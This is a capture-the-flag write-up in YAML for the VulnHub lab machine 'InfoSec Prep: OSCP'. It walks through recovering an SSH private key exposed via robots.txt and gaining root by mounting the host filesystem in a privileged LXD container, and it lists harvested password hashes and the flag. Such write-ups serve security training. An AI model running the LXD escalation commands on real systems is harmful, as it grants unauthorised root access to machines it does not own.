@@ -1,0 +1,175 @@
+writeup:
+  metadata:
+    status: public
+    datetime: 20200810
+    infra: VulnHub
+    name: "InfoSec Prep: OSCP"
+    points: 10
+    path: vulnhub.infosecpreposcp
+    url: https://www.vulnhub.com/entry/infosec-prep-oscp,508/
+    references:
+      - https://reboare.github.io/lxd/lxd-escape.html
+      - https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation
+      - https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025
+    categories:
+      - vulnhub
+      - linux
+    tags:
+      - enumerate_proto_http
+      - exploit_ssh_privatekeys
+      - privesc_lxc_bash
+  overview:
+    description: |
+      This is a writeup for VulnHub VM [`InfoSec Prep: OSCP`](https://www.vulnhub.com/entry/infosec-prep-oscp,508/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
+    killchain:
+      - "_ [VulnHub] InfoSec Prep: OSCP/192.168.119.198":
+        - ". 22/tcp":
+        - ". 80/tcp":
+          - ". wordpress blog: ssh user -> oscp":
+            - ". gobuster/robots.txt -> /secret.txt":
+              - ". secret.txt containes base64 encoded ssh pvt key":
+                - ".. download ssh key, set right permissions (600) and login":
+                  - ".. ssh (oscp)":
+                    - "... user is member of lxc group":
+                      - "... lxc/lxd not in path":
+                        - "... use absolute filenames and setup bash container":
+                          - "... shell (root)":
+                            - "... /mnt/root/root/flag.txt":
+        - ". 33060/tcp":
+    ttps:
+      "80/tcp/http/Apache httpd 2.4.41 ((Ubuntu))": enumerate_proto_http exploit_ssh_privatekeys privesc_lxc_bash
+  enumeration:
+    steps:
+      - description: |
+          Here's the Nmap scan result:
+        command: |
+          # Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
+          Nmap scan report for 192.168.119.198
+          Host is up, received user-set (0.0022s latency).
+          Scanned at 2020-07-20 12:04:12 IST for 9s
+          Not shown: 998 closed ports
+          Reason: 998 conn-refused
+          PORT   STATE SERVICE REASON  VERSION
+          22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+          80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+          |_http-generator: WordPress 5.4.2
+          | http-methods: 
+          |_  Supported Methods: GET HEAD POST OPTIONS
+          | http-robots.txt: 1 disallowed entry 
+          |_/secret.txt
+          |_http-server-header: Apache/2.4.41 (Ubuntu)
+          |_http-title: OSCP Voucher &#8211; Just another WordPress site
+          Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+          Read data files from: /usr/bin/../share/nmap
+          Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+          # Nmap done at Mon Jul 20 12:04:21 2020 -- 1 IP address (1 host up) scanned in 24.59 seconds
+      - description: |
+          We find `80/tcp` to be open. Upon browsing the webpage we see that it looks to be a Wordpress blog with a post named "OSCP Voucher". This posts lists the process to submit the flag and also mentions that there's a user named `oscp` on this machine:
+        command: |
+        screenshot:
+          - ./screenshot01.png
+      - description: |
+          The `gobuster` scan result confirms that this is a Wordpress blog. We see an interesting entry `secret.txt` from `gobuster` scan results and also from the `robots.txt` file:
+        command: |
+        screenshot:
+          - ./screenshot02.png
+          - ./screenshot03.png
+      - description: |
+          This file has base64 encoded content that we decode to find a SSH private key file:
+        command: |
+          curl http://192.168.119.198/secret.txt | base64 -d -
+        screenshot:
+          - ./screenshot04.png
+    findings:
+      openports:
+        - 22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux protocol 2.0)
+        - 80/tcp      http       Apache httpd 2.4.41 ((Ubuntu))
+        - 33060/tcp   socks5
+      files:
+        - http://192.168.119.198/secret.txt
+        - http://192.168.119.198/license.txt
+      users:
+        ssh:
+          - oscp
+        wordpress:
+          - admin
+  exploitation:
+    steps:
+      - description: |
+          We can try to SSH into the machine as user `oscp` using the SSH private key file. First, we need to set right permissions to the key file and then use it for login:
+        command: |
+          curl http://192.168.119.198/secret.txt | base64 -d - >./sshkey.pvt
+          chmod 600 sshkey.pvt
+          ssh -i sshkey.pvt oscp@192.168.119.198
+        screenshot:
+          - ./screenshot05.png
+      - description: |
+          We successfully login and get interactive access of the machine as user `oscp`:
+        command: |
+        screenshot:
+          - ./screenshot06.png
+  postexploit:
+    user: oscp
+    hostname: oscp
+    id: |
+      uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+    uname: |
+      Linux oscp 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+    ifconfig: |
+      eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.119.198  netmask 255.255.255.0  broadcast 192.168.119.255
+        inet6 fe80::20c:29ff:fee6:a4ab  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:e6:a4:ab  txqueuelen 1000  (Ethernet)
+        RX packets 389730  bytes 88031188 (88.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 297471  bytes 52912167 (52.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+      lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+              inet 127.0.0.1  netmask 255.0.0.0
+              inet6 ::1  prefixlen 128  scopeid 0x10<host>
+              loop  txqueuelen 1000  (Local Loopback)
+              RX packets 694  bytes 64212 (64.2 KB)
+              RX errors 0  dropped 0  overruns 0  frame 0
+              TX packets 694  bytes 64212 (64.2 KB)
+              TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+    users:
+      - root
+      - oscp
+  privesc:
+    steps:
+      - description: |
+          From the output of command `id`, we see that the user `oscp` is a member of `lxd` group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the `lxc` command for this to work is not found in our current environment path:
+        command: |
+          lxc init ubuntu:16.04 test -c security.privileged=true
+            -bash: lxc: command not found
+        screenshot:
+          - ./screenshot09.png
+      - description: |
+          We locate the file and use it's absolute path to create the container. This time we see another error about storage pool. The error message helpfully points us in the right direction and we need to initialize LXD first. We use the suggested command with the absolute path and choose default settings when prompted for a change:
+        command: |
+          /snap/bin/lxd init
+          /snap/bin/lxc init ubuntu:16.04 test -c security.privileged=true
+          /snap/bin/lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+          /snap/bin/lxc start test
+          /snap/bin/lxc exec test bash
+        screenshot:
+          - ./screenshot10.png
+          - ./screenshot11.png
+          - ./screenshot12.png
+          - ./screenshot13.png
+  loot:
+    hashes:
+      - "oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmBFu/Sf.:18452:0:99999:7:::"
+      - "root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEgm9QfT1:18452:0:99999:7:::"
+    credentials:
+      mysql:
+        - "wordpress/Oscp12345!"
+      wordpress:
+        - "admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2P36Pr1D0"
+    flags:
+      - "/mnt/root/root/flag.txt: d73b04b0e696b0945283defa3eee4538"
+  learning:
+    - The SSH key for a user on the target machine was exposed via web application. Although the file was base64 encoded and listed within `robots.txt`, it doesn't stop an attacker from accessing it.
+    - The local user was member of the LXD group which allowed to create a privileged container with access to the entire file system. This lead to complete access of files, even those that have been restricted to `root` user only.
